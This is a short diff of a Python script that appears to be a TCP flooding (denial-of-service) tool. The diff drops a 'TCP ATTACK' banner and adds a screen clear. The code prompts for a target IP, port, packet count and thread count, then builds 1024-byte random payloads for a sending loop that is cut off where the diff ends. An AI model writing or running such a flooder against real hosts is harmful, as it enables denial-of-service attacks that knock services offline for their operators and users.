@@ -6,13 +6,12 @@ import threading
 import os,sys
 os.system("clear")
 
-print("TCP ATTACK")
-
 ip_bos = str(input("Ip Target : "))
 port_bos = int(input("Port Target : "))
 paket_bos = int(input("Pakets : "))
 threads_bos = int(input("Threads : "))
 
+os.system("clear")
 def bos():
     boss = random._urandom(1024)
     while True:
